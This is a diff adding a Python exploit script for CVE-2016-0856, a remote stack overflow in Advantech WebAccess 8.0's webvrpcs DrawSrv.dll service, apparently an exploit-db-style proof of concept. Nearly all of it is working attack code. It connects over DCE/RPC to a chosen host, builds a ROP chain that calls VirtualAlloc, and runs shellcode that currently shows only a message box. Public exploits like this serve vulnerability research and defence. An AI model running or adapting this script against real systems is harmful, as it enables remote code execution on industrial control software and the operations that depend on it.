@@ -1,0 +1,133 @@
+#!/usr/bin/python2.7
+  
+# Exploit Title: Advantech WebAccess < 8.1 webvrpcs DrawSrv.dll Path BwBuildPath Stack-Based Buffer Overflow RCE
+# Date: 03-29-2018
+# Exploit Author: Chris Lyne (@lynerc)
+# Vendor Homepage: www.advantech.com
+# Software Link: http://advcloudfiles.advantech.com/web/Download/webaccess/8.0/AdvantechWebAccessUSANode8.0_20150816.exe
+# Version: Advantech WebAccess 8.0-2015.08.16
+# Tested on: Windows Server 2008 R2 Enterprise 64-bit
+# CVE : CVE-2016-0856
+# See Also: https://www.zerodayinitiative.com/advisories/ZDI-16-093/
+
+import sys, struct
+from impacket import uuid
+from impacket.dcerpc.v5 import transport
+
+def call(dce, opcode, stubdata):
+  dce.call(opcode, stubdata)
+  res = -1
+  try:
+    res = dce.recv()
+  except Exception, e:
+    print "Exception encountered..." + str(e)
+    sys.exit(1)
+  return res
+
+if len(sys.argv) != 2:
+  print "Provide only host arg"
+  sys.exit(1)
+
+port = 4592
+interface = "5d2b62aa-ee0a-4a95-91ae-b064fdb471fc"
+version = "1.0" 
+
+host = sys.argv[1]
+
+string_binding = "ncacn_ip_tcp:%s" % host
+trans = transport.DCERPCTransportFactory(string_binding)
+trans.set_dport(port)
+
+dce = trans.get_dce_rpc()
+dce.connect()
+
+print "Binding..."
+iid = uuid.uuidtup_to_bin((interface, version))
+dce.bind(iid)
+
+print "...1"
+stubdata = struct.pack("<III", 0x00, 0xc351, 0x04)
+call(dce, 2, stubdata)
+
+print "...2"
+stubdata = struct.pack("<I", 0x02)
+res = call(dce, 4, stubdata)
+if res == -1:
+  print "Something went wrong"
+  sys.exit(1)
+res = struct.unpack("III", res)
+
+if (len(res) < 3):
+  print "Received unexpected length value"
+  sys.exit(1)
+
+print "...3"
+
+# MessageBoxA() Shellcode
+# Credit: https://www.exploit-db.com/exploits/40245/
+shellcode = ("\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x48\x10\x31\xdb\x8b\x59\x3c\x01\xcb\x8b\x5b\x78\x01\xcb\x8b\x73\x20\x01\xce\x31\xd2\x42\xad\x01\xc8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x73\x1c\x01\xce\x8b\x14\x96\x01\xca\x89\xd6\x89\xcf\x31\xdb\x53\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x51\xff\xd2\x83\xc4\x10\x31\xc9\x68\x6c\x6c\x42\x42\x88\x4c\x24\x02\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x0c\x31\xc9\x68\x6f\x78\x41\x42\x88\x4c\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd6\x83\xc4\x0c\x31\xd2\x31\xc9\x52\x68\x73\x67\x21\x21\x68\x6c\x65\x20\x6d\x68\x53\x61\x6d\x70\x8d\x14\x24\x51\x68\x68\x65\x72\x65\x68\x68\x69\x20\x54\x8d\x0c\x24\x31\xdb\x43\x53\x52\x51\x31\xdb\x53\xff\xd0\x31\xc9\x68\x65\x73\x73\x41\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x8d\x0c\x24\x51\x57\xff\xd6\x31\xc9\x51\xff\xd0")
+
+def create_rop_chain():
+    rop_gadgets = [
+      0x0704ac03,  # XOR EAX,EAX # RETN    ** [BwPAlarm.dll]             eax = 0
+      0x0706568c,  # XOR EDX,EDX # RETN    ** [BwPAlarm.dll]             edx = 0
+
+      0x0702455b,  # ADD EAX,40 # RETN    ** [BwPAlarm.dll] **           eax = 0x40
+      0x0702823d,  # PUSH EAX # ADD BYTE PTR DS:[ESI],7 # MOV DWORD PTR DS:[7070768],0 # POP ECX # RETN
+      # ecx = 0x40
+    ]
+    for i in range(0, 63):
+        rop_gadgets.append(0x0702455b) # ADD EAX,40 # RETN    ** [BwPAlarm.dll] **
+    # eax = 0x1000
+    
+    rop_gadgets += [
+      0x0702143d,  # ADD EDX,EAX # ADD AL,0 # AND EAX,0FF # RETN 0x04    ** [BwPAlarm.dll]
+      # edx = eax
+      # edx = 0x1000
+
+      0x07065b7b,  # POP EDI # RETN [BwPAlarm.dll]
+      0x41414141, 
+      0x07059581,  # RETN (ROP NOP) [BwPAlarm.dll]
+      # edi = RETN
+
+      0x0705ddfd,  # POP EAX # RETN [BwPAlarm.dll]
+      0x0201e104,  # ptr to &VirtualAlloc() [IAT BwKrlAPI.dll]
+      0x070630eb,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BwPAlarm.dll]
+      0x070488f7,  # PUSH EAX # MOV EAX,DWORD PTR DS:[EDX*4+7068548] # AND EAX,ESI # POP ESI # POP EBX # RETN 
+      # esi -> PTR to VirtualAlloc
+      0xFFFFFFFF # ebx = -1
+    ]
+    for i in range(0, len(shellcode)+1):
+      rop_gadgets.append(0x0703e116) # INC EBX # MOV AX,10 # RETN    ** [BwPAlarm.dll]
+    # ebx = size of shellcode
+
+    rop_gadgets += [
+      0x070441d1,  # POP EBP # RETN [BwPAlarm.dll]
+      0x0703fe39,  # POINTER INC ECX # PUSH ESP # RETN    ** [BwPAlarm.dll] **
+      # ebp -> Return to ESP
+      
+      0x0705ddfd,  # POP EAX # RETN [BwPAlarm.dll] ------ Modified by me 
+      0x90909090,  # nop
+      # eax = 0x90909090
+
+      0x07010f5c  # PUSHAD # RETN [BwPAlarm.dll] 
+    ]
+
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+# construct buffer
+buf = "A"*379
+buf += "\x33\xb7\x01\x07" # 0701b733 RETN
+buf += create_rop_chain()
+buf += shellcode
+
+# ioctl 0x278E
+stubdata = struct.pack("<IIII", res[2], 0x278E, len(buf), len(buf))
+
+fmt = "<" + str(len(buf)) + "s"
+stubdata += struct.pack(fmt, buf)
+
+print "\nDid it work?"
+call(dce, 1, stubdata)
+
+dce.disconnect()
